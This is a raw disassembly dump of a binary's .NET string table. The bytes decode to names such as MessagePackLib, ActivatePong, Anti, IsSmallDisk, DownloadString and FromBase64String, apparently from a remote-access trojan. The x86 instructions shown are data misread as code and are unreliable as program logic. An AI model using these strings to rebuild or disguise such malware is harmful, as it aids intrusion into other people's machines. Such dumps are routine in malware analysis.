  4080e5:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080ec:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f1:	65 74 65             	gs je  0x408159
  4080f4:	00 43 61             	add    %al,0x61(%ebx)
  4080f7:	6c                   	insb   (%dx),%es:(%edi)
  4080f8:	6c                   	insb   (%dx),%es:(%edi)
  4080f9:	53                   	push   %ebx
  4080fa:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408101:	74 
  408102:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408106:	6d                   	insl   (%dx),%es:(%edi)
  408107:	70 69                	jo     0x408172
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	65 72 47             	gs jb  0x408154
  40810d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40810f:	65 72 61             	gs jb  0x408173
  408112:	74 65                	je     0x408179
  408114:	64 41                	fs inc %ecx
  408116:	74 74                	je     0x40818c
  408118:	72 69                	jb     0x408183
  40811a:	62 75 74             	bound  %esi,0x74(%ebp)
  40811d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408122:	75 67                	jne    0x40818b
  408124:	67 61                	addr16 popa
  408126:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40812a:	74 74                	je     0x4081a0
  40812c:	72 69                	jb     0x408197
  40812e:	62 75 74             	bound  %esi,0x74(%ebp)
  408131:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408135:	6d                   	insl   (%dx),%es:(%edi)
  408136:	56                   	push   %esi
  408137:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40813e:	74 74                	je     0x4081b4
  408140:	72 69                	jb     0x4081ab
  408142:	62 75 74             	bound  %esi,0x74(%ebp)
  408145:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408149:	73 65                	jae    0x4081b0
  40814b:	6d                   	insl   (%dx),%es:(%edi)
  40814c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408150:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408157:	72 
  408158:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40815f:	73 73                	jae    0x4081d4
  408161:	65 6d                	gs insl (%dx),%es:(%edi)
  408163:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408167:	72 61                	jb     0x4081ca
  408169:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40816c:	61                   	popa
  40816d:	72 6b                	jb     0x4081da
  40816f:	41                   	inc    %ecx
  408170:	74 74                	je     0x4081e6
  408172:	72 69                	jb     0x4081dd
  408174:	62 75 74             	bound  %esi,0x74(%ebp)
  408177:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40817c:	67 65 74 46          	addr16 gs je 0x4081c6
  408180:	72 61                	jb     0x4081e3
  408182:	6d                   	insl   (%dx),%es:(%edi)
  408183:	65 77 6f             	gs ja  0x4081f5
  408186:	72 6b                	jb     0x4081f3
  408188:	41                   	inc    %ecx
  408189:	74 74                	je     0x4081ff
  40818b:	72 69                	jb     0x4081f6
  40818d:	62 75 74             	bound  %esi,0x74(%ebp)
  408190:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408194:	73 65                	jae    0x4081fb
  408196:	6d                   	insl   (%dx),%es:(%edi)
  408197:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40819b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081a2:	69 
  4081a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a5:	41                   	inc    %ecx
  4081a6:	74 74                	je     0x40821c
  4081a8:	72 69                	jb     0x408213
  4081aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4081ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b1:	73 65                	jae    0x408218
  4081b3:	6d                   	insl   (%dx),%es:(%edi)
  4081b4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ba:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c0:	74 69                	je     0x40822b
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	41                   	inc    %ecx
  4081c5:	74 74                	je     0x40823b
  4081c7:	72 69                	jb     0x408232
  4081c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4081cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d0:	73 65                	jae    0x408237
  4081d2:	6d                   	insl   (%dx),%es:(%edi)
  4081d3:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081d7:	65 73 63             	gs jae 0x40823d
  4081da:	72 69                	jb     0x408245
  4081dc:	70 74                	jo     0x408252
  4081de:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081e5:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081ec:	65 66 61             	gs popaw
  4081ef:	75 6c                	jne    0x40825d
  4081f1:	74 4d                	je     0x408240
  4081f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4081f5:	62 65 72             	bound  %esp,0x72(%ebp)
  4081f8:	41                   	inc    %ecx
  4081f9:	74 74                	je     0x40826f
  4081fb:	72 69                	jb     0x408266
  4081fd:	62 75 74             	bound  %esi,0x74(%ebp)
  408200:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408204:	6d                   	insl   (%dx),%es:(%edi)
  408205:	70 69                	jo     0x408270
  408207:	6c                   	insb   (%dx),%es:(%edi)
  408208:	61                   	popa
  408209:	74 69                	je     0x408274
  40820b:	6f                   	outsl  %ds:(%esi),(%dx)
  40820c:	6e                   	outsb  %ds:(%esi),(%dx)
  40820d:	52                   	push   %edx
  40820e:	65 6c                	gs insb (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	78 61                	js     0x408274
  408213:	74 69                	je     0x40827e
  408215:	6f                   	outsl  %ds:(%esi),(%dx)
  408216:	6e                   	outsb  %ds:(%esi),(%dx)
  408217:	73 41                	jae    0x40825a
  408219:	74 74                	je     0x40828f
  40821b:	72 69                	jb     0x408286
  40821d:	62 75 74             	bound  %esi,0x74(%ebp)
  408220:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408224:	73 65                	jae    0x40828b
  408226:	6d                   	insl   (%dx),%es:(%edi)
  408227:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40822b:	72 6f                	jb     0x40829c
  40822d:	64 75 63             	fs jne 0x408293
  408230:	74 41                	je     0x408273
  408232:	74 74                	je     0x4082a8
  408234:	72 69                	jb     0x40829f
  408236:	62 75 74             	bound  %esi,0x74(%ebp)
  408239:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40823d:	73 65                	jae    0x4082a4
  40823f:	6d                   	insl   (%dx),%es:(%edi)
  408240:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408244:	6f                   	outsl  %ds:(%esi),(%dx)
  408245:	70 79                	jo     0x4082c0
  408247:	72 69                	jb     0x4082b2
  408249:	67 68 74 41 74 74    	addr16 push $0x74744174
  40824f:	72 69                	jb     0x4082ba
  408251:	62 75 74             	bound  %esi,0x74(%ebp)
  408254:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408258:	73 65                	jae    0x4082bf
  40825a:	6d                   	insl   (%dx),%es:(%edi)
  40825b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40825f:	6f                   	outsl  %ds:(%esi),(%dx)
  408260:	6d                   	insl   (%dx),%es:(%edi)
  408261:	70 61                	jo     0x4082c4
  408263:	6e                   	outsb  %ds:(%esi),(%dx)
  408264:	79 41                	jns    0x4082a7
  408266:	74 74                	je     0x4082dc
  408268:	72 69                	jb     0x4082d3
  40826a:	62 75 74             	bound  %esi,0x74(%ebp)
  40826d:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408271:	6e                   	outsb  %ds:(%esi),(%dx)
  408272:	74 69                	je     0x4082dd
  408274:	6d                   	insl   (%dx),%es:(%edi)
  408275:	65 43                	gs inc %ebx
  408277:	6f                   	outsl  %ds:(%esi),(%dx)
  408278:	6d                   	insl   (%dx),%es:(%edi)
  408279:	70 61                	jo     0x4082dc
  40827b:	74 69                	je     0x4082e6
  40827d:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408280:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408287:	69 
  408288:	62 75 74             	bound  %esi,0x74(%ebp)
  40828b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40828f:	74 5f                	je     0x4082f0
  408291:	55                   	push   %ebp
  408292:	73 65                	jae    0x4082f9
  408294:	53                   	push   %ebx
  408295:	68 65 6c 6c 45       	push   $0x456c6c65
  40829a:	78 65                	js     0x408301
  40829c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40829f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082a3:	61                   	popa
  4082a4:	64 42                	fs inc %edx
  4082a6:	79 74                	jns    0x40831c
  4082a8:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082ac:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082b3:	00 
  4082b4:	44                   	inc    %esp
  4082b5:	65 6c                	gs insb (%dx),%es:(%edi)
  4082b7:	65 74 65             	gs je  0x40831f
  4082ba:	56                   	push   %esi
  4082bb:	61                   	popa
  4082bc:	6c                   	insb   (%dx),%es:(%edi)
  4082bd:	75 65                	jne    0x408324
  4082bf:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c3:	65 72 56             	gs jb  0x40831c
  4082c6:	61                   	popa
  4082c7:	6c                   	insb   (%dx),%es:(%edi)
  4082c8:	75 65                	jne    0x40832f
  4082ca:	00 47 65             	add    %al,0x65(%edi)
  4082cd:	74 56                	je     0x408325
  4082cf:	61                   	popa
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	75 65                	jne    0x408338
  4082d3:	00 53 65             	add    %dl,0x65(%ebx)
  4082d6:	74 56                	je     0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 76 61             	add    %dh,0x61(%esi)
  4082df:	6c                   	insb   (%dx),%es:(%edi)
  4082e0:	75 65                	jne    0x408347
  4082e2:	00 67 65             	add    %ah,0x65(%edi)
  4082e5:	74 5f                	je     0x408346
  4082e7:	4b                   	dec    %ebx
  4082e8:	65 65 70 41          	gs gs jo 0x40832d
  4082ec:	6c                   	insb   (%dx),%es:(%edi)
  4082ed:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082f4:	5f                   	pop    %edi
  4082f5:	4b                   	dec    %ebx
  4082f6:	65 65 70 41          	gs gs jo 0x40833b
  4082fa:	6c                   	insb   (%dx),%es:(%edi)
  4082fb:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408302:	6f                   	outsl  %ds:(%esi),(%dx)
  408303:	76 65                	jbe    0x40836a
  408305:	00 57 61             	add    %dl,0x61(%edi)
  408308:	74 65                	je     0x40836f
  40830a:	72 66                	jb     0x408372
  40830c:	6f                   	outsl  %ds:(%esi),(%dx)
  40830d:	78 2e                	js     0x40833d
  40830f:	65 78 65             	gs js  0x408377
  408312:	00 73 65             	add    %dh,0x65(%ebx)
  408315:	74 5f                	je     0x408376
  408317:	42                   	inc    %edx
  408318:	6c                   	insb   (%dx),%es:(%edi)
  408319:	6f                   	outsl  %ds:(%esi),(%dx)
  40831a:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40831d:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408324:	5f                   	pop    %edi
  408325:	54                   	push   %esp
  408326:	6f                   	outsl  %ds:(%esi),(%dx)
  408327:	74 61                	je     0x40838a
  408329:	6c                   	insb   (%dx),%es:(%edi)
  40832a:	53                   	push   %ebx
  40832b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408332:	5f                   	pop    %edi
  408333:	48                   	dec    %eax
  408334:	65 61                	gs popa
  408336:	64 65 72 53          	fs gs jb 0x40838d
  40833a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408341:	5f                   	pop    %edi
  408342:	48                   	dec    %eax
  408343:	65 61                	gs popa
  408345:	64 65 72 53          	fs gs jb 0x40839c
  408349:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408350:	5f                   	pop    %edi
  408351:	53                   	push   %ebx
  408352:	65 6e                	outsb  %gs:(%esi),(%dx)
  408354:	64 42                	fs inc %edx
  408356:	75 66                	jne    0x4083be
  408358:	66 65 72 53          	data16 gs jb 0x4083af
  40835c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408363:	5f                   	pop    %edi
  408364:	52                   	push   %edx
  408365:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408369:	76 65                	jbe    0x4083d0
  40836b:	42                   	inc    %edx
  40836c:	75 66                	jne    0x4083d4
  40836e:	66 65 72 53          	data16 gs jb 0x4083c5
  408372:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408379:	5f                   	pop    %edi
  40837a:	4b                   	dec    %ebx
  40837b:	65 79 53             	gs jns 0x4083d1
  40837e:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408385:	65 78 4f             	gs js  0x4083d7
  408388:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40838c:	72 46                	jb     0x4083d4
  40838e:	6c                   	insb   (%dx),%es:(%edi)
  40838f:	61                   	popa
  408390:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408394:	79 70                	jns    0x408406
  408396:	74 6f                	je     0x408407
  408398:	43                   	inc    %ebx
  408399:	6f                   	outsl  %ds:(%esi),(%dx)
  40839a:	6e                   	outsb  %ds:(%esi),(%dx)
  40839b:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a1:	74 5f                	je     0x408402
  4083a3:	50                   	push   %eax
  4083a4:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ab:	5f                   	pop    %edi
  4083ac:	50                   	push   %eax
  4083ad:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083b4:	74 65                	je     0x40841b
  4083b6:	6d                   	insl   (%dx),%es:(%edi)
  4083b7:	2e 54                	cs push %esp
  4083b9:	68 72 65 61 64       	push   $0x64616572
  4083be:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083c5:	5f                   	pop    %edi
  4083c6:	50                   	push   %eax
  4083c7:	61                   	popa
  4083c8:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083cf:	64 64 
  4083d1:	5f                   	pop    %edi
  4083d2:	53                   	push   %ebx
  4083d3:	65 73 73             	gs jae 0x408449
  4083d6:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4083de:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e2:	73 74                	jae    0x408458
  4083e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4083e6:	45                   	inc    %ebp
  4083e7:	76 65                	jbe    0x40844e
  4083e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ea:	74 73                	je     0x40845f
  4083ec:	5f                   	pop    %edi
  4083ed:	53                   	push   %ebx
  4083ee:	65 73 73             	gs jae 0x408464
  4083f1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f9:	67 00 55 54          	add    %dl,0x54(%di)
  4083fd:	46                   	inc    %esi
  4083fe:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408401:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408404:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40840b:	74 65                	je     0x408472
  40840d:	6d                   	insl   (%dx),%es:(%edi)
  40840e:	2e 44                	cs inc %esp
  408410:	72 61                	jb     0x408473
  408412:	77 69                	ja     0x40847d
  408414:	6e                   	outsb  %ds:(%esi),(%dx)
  408415:	67 2e 49             	addr16 cs dec %ecx
  408418:	6d                   	insl   (%dx),%es:(%edi)
  408419:	61                   	popa
  40841a:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408421:	73 
  408422:	74 65                	je     0x408489
  408424:	6d                   	insl   (%dx),%es:(%edi)
  408425:	2e 52                	cs push %edx
  408427:	75 6e                	jne    0x408497
  408429:	74 69                	je     0x408494
  40842b:	6d                   	insl   (%dx),%es:(%edi)
  40842c:	65 2e 56             	gs cs push %esi
  40842f:	65 72 73             	gs jb  0x4084a5
  408432:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408439:	46                   	inc    %esi
  40843a:	72 6f                	jb     0x4084ab
  40843c:	6d                   	insl   (%dx),%es:(%edi)
  40843d:	42                   	inc    %edx
  40843e:	61                   	popa
  40843f:	73 65                	jae    0x4084a6
  408441:	36 34 53             	ss xor $0x53,%al
  408444:	74 72                	je     0x4084b8
  408446:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40844d:	61                   	popa
  40844e:	73 65                	jae    0x4084b5
  408450:	36 34 53             	ss xor $0x53,%al
  408453:	74 72                	je     0x4084c7
  408455:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40845c:	64 53                	fs push %ebx
  40845e:	74 72                	je     0x4084d2
  408460:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408467:	6e                   	outsb  %ds:(%esi),(%dx)
  408468:	6c                   	insb   (%dx),%es:(%edi)
  408469:	6f                   	outsl  %ds:(%esi),(%dx)
  40846a:	61                   	popa
  40846b:	64 53                	fs push %ebx
  40846d:	74 72                	je     0x4084e1
  40846f:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408476:	74 65                	je     0x4084dd
  408478:	53                   	push   %ebx
  408479:	74 72                	je     0x4084ed
  40847b:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408482:	74 72                	je     0x4084f6
  408484:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40848b:	5f                   	pop    %edi
  40848c:	41                   	inc    %ecx
  40848d:	73 53                	jae    0x4084e2
  40848f:	74 72                	je     0x408503
  408491:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408498:	5f                   	pop    %edi
  408499:	41                   	inc    %ecx
  40849a:	73 53                	jae    0x4084ef
  40849c:	74 72                	je     0x408510
  40849e:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084a5:	65 73 41             	gs jae 0x4084e9
  4084a8:	73 53                	jae    0x4084fd
  4084aa:	74 72                	je     0x40851e
  4084ac:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b3:	41                   	inc    %ecx
  4084b4:	73 53                	jae    0x408509
  4084b6:	74 72                	je     0x40852a
  4084b8:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084bf:	41                   	inc    %ecx
  4084c0:	73 53                	jae    0x408515
  4084c2:	74 72                	je     0x408536
  4084c4:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084cb:	53                   	push   %ebx
  4084cc:	74 72                	je     0x408540
  4084ce:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084d5:	65 73 41             	gs jae 0x408519
  4084d8:	73 48                	jae    0x408522
  4084da:	65 78 53             	gs js  0x408530
  4084dd:	74 72                	je     0x408551
  4084df:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084e6:	73 74                	jae    0x40855c
  4084e8:	72 69                	jb     0x408553
  4084ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4084eb:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084ef:	73 74                	jae    0x408565
  4084f1:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f3:	2e 44                	cs inc %esp
  4084f5:	72 61                	jb     0x408558
  4084f7:	77 69                	ja     0x408562
  4084f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fa:	67 00 67 65          	add    %ah,0x65(%bx)
  4084fe:	74 5f                	je     0x40855f
  408500:	41                   	inc    %ecx
  408501:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408505:	61                   	popa
  408506:	74 65                	je     0x40856d
  408508:	50                   	push   %eax
  408509:	6f                   	outsl  %ds:(%esi),(%dx)
  40850a:	6e                   	outsb  %ds:(%esi),(%dx)
  40850b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40850f:	74 5f                	je     0x408570
  408511:	41                   	inc    %ecx
  408512:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408516:	61                   	popa
  408517:	74 65                	je     0x40857e
  408519:	50                   	push   %eax
  40851a:	6f                   	outsl  %ds:(%esi),(%dx)
  40851b:	6e                   	outsb  %ds:(%esi),(%dx)
  40851c:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408520:	74 5f                	je     0x408581
  408522:	45                   	inc    %ebp
  408523:	72 72                	jb     0x408597
  408525:	6f                   	outsl  %ds:(%esi),(%dx)
  408526:	72 44                	jb     0x40856c
  408528:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  40852f:	73 67                	jae    0x408598
  408531:	00 43 6f             	add    %al,0x6f(%ebx)
  408534:	6d                   	insl   (%dx),%es:(%edi)
  408535:	70 75                	jo     0x4085ac
  408537:	74 65                	je     0x40859e
  408539:	48                   	dec    %eax
  40853a:	61                   	popa
  40853b:	73 68                	jae    0x4085a5
  40853d:	00 73 74             	add    %dh,0x74(%ebx)
  408540:	72 54                	jb     0x408596
  408542:	6f                   	outsl  %ds:(%esi),(%dx)
  408543:	48                   	dec    %eax
  408544:	61                   	popa
  408545:	73 68                	jae    0x4085af
  408547:	00 47 65             	add    %al,0x65(%edi)
  40854a:	74 48                	je     0x408594
  40854c:	61                   	popa
  40854d:	73 68                	jae    0x4085b7
  40854f:	00 56 65             	add    %dl,0x65(%esi)
  408552:	72 69                	jb     0x4085bd
  408554:	66 79 48             	data16 jns 0x40859f
  408557:	61                   	popa
  408558:	73 68                	jae    0x4085c2
  40855a:	00 46 6c             	add    %al,0x6c(%esi)
  40855d:	75 73                	jne    0x4085d2
  40855f:	68 00 67 65 74       	push   $0x74656700
  408564:	5f                   	pop    %edi
  408565:	45                   	inc    %ebp
  408566:	78 65                	js     0x4085cd
  408568:	63 75 74             	arpl   %esi,0x74(%ebp)
  40856b:	61                   	popa
  40856c:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408570:	61                   	popa
  408571:	74 68                	je     0x4085db
  408573:	00 47 65             	add    %al,0x65(%edi)
  408576:	74 54                	je     0x4085cc
  408578:	65 6d                	gs insl (%dx),%es:(%edi)
  40857a:	70 50                	jo     0x4085cc
  40857c:	61                   	popa
  40857d:	74 68                	je     0x4085e7
  40857f:	00 70 61             	add    %dh,0x61(%eax)
  408582:	74 68                	je     0x4085ec
  408584:	00 48 6d             	add    %cl,0x6d(%eax)
  408587:	61                   	popa
  408588:	63 53 68             	arpl   %edx,0x68(%ebx)
  40858b:	61                   	popa
  40858c:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408592:	67 74 68             	addr16 je 0x4085fd
  408595:	00 67 65             	add    %ah,0x65(%edi)
  408598:	74 5f                	je     0x4085f9
  40859a:	4c                   	dec    %esp
  40859b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40859d:	67 74 68             	addr16 je 0x408608
  4085a0:	00 49 76             	add    %cl,0x76(%ecx)
  4085a3:	4c                   	dec    %esp
  4085a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a6:	67 74 68             	addr16 je 0x408611
  4085a9:	00 41 75             	add    %al,0x75(%ecx)
  4085ac:	74 68                	je     0x408616
  4085ae:	4b                   	dec    %ebx
  4085af:	65 79 4c             	gs jns 0x4085fe
  4085b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b4:	67 74 68             	addr16 je 0x40861f
  4085b7:	00 55 72             	add    %dl,0x72(%ebp)
  4085ba:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c0:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c3:	67 70 61             	addr16 jo 0x408627
  4085c6:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085c9:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085cc:	6c                   	insb   (%dx),%es:(%edi)
  4085cd:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d5:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d8:	4d                   	dec    %ebp
  4085d9:	65 73 73             	gs jae 0x40864f
  4085dc:	61                   	popa
  4085dd:	67 65 50             	addr16 gs push %eax
  4085e0:	61                   	popa
  4085e1:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085e4:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085eb:	61                   	popa
  4085ec:	67 65 50             	addr16 gs push %eax
  4085ef:	61                   	popa
  4085f0:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f3:	4d                   	dec    %ebp
  4085f4:	73 67                	jae    0x40865d
  4085f6:	50                   	push   %eax
  4085f7:	61                   	popa
  4085f8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fb:	41                   	inc    %ecx
  4085fc:	73 79                	jae    0x408677
  4085fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ff:	63 43 61             	arpl   %eax,0x61(%ebx)
  408602:	6c                   	insb   (%dx),%es:(%edi)
  408603:	6c                   	insb   (%dx),%es:(%edi)
  408604:	62 61 63             	bound  %esp,0x63(%ecx)
  408607:	6b 00 52             	imul   $0x52,(%eax),%eax
  40860a:	65 6d                	gs insl (%dx),%es:(%edi)
  40860c:	6f                   	outsl  %ds:(%esi),(%dx)
  40860d:	74 65                	je     0x408674
  40860f:	43                   	inc    %ebx
  408610:	65 72 74             	gs jb  0x408687
  408613:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40861a:	56                   	push   %esi
  40861b:	61                   	popa
  40861c:	6c                   	insb   (%dx),%es:(%edi)
  40861d:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408624:	43 
  408625:	61                   	popa
  408626:	6c                   	insb   (%dx),%es:(%edi)
  408627:	6c                   	insb   (%dx),%es:(%edi)
  408628:	62 61 63             	bound  %esp,0x63(%ecx)
  40862b:	6b 00 54             	imul   $0x54,(%eax),%eax
  40862e:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408635:	6c                   	insb   (%dx),%es:(%edi)
  408636:	62 61 63             	bound  %esp,0x63(%ecx)
  408639:	6b 00 75             	imul   $0x75,(%eax),%eax
  40863c:	6e                   	outsb  %ds:(%esi),(%dx)
  40863d:	70 61                	jo     0x4086a0
  40863f:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408642:	6d                   	insl   (%dx),%es:(%edi)
  408643:	73 67                	jae    0x4086ac
  408645:	70 61                	jo     0x4086a8
  408647:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40864a:	52                   	push   %edx
  40864b:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408652:	4b 65 
  408654:	79 50                	jns    0x4086a6
  408656:	65 72 6d             	gs jb  0x4086c6
  408659:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408660:	68 65 63 6b 00       	push   $0x6b6365
  408665:	46                   	inc    %esi
  408666:	6c                   	insb   (%dx),%es:(%edi)
  408667:	75 73                	jne    0x4086dc
  408669:	68 46 69 6e 61       	push   $0x616e6946
  40866e:	6c                   	insb   (%dx),%es:(%edi)
  40866f:	42                   	inc    %edx
  408670:	6c                   	insb   (%dx),%es:(%edi)
  408671:	6f                   	outsl  %ds:(%esi),(%dx)
  408672:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408675:	49                   	dec    %ecx
  408676:	73 53                	jae    0x4086cb
  408678:	6d                   	insl   (%dx),%es:(%edi)
  408679:	61                   	popa
  40867a:	6c                   	insb   (%dx),%es:(%edi)
  40867b:	6c                   	insb   (%dx),%es:(%edi)
  40867c:	44                   	inc    %esp
  40867d:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408684:	6c                   	insb   (%dx),%es:(%edi)
  408685:	00 66 56             	add    %ah,0x56(%esi)
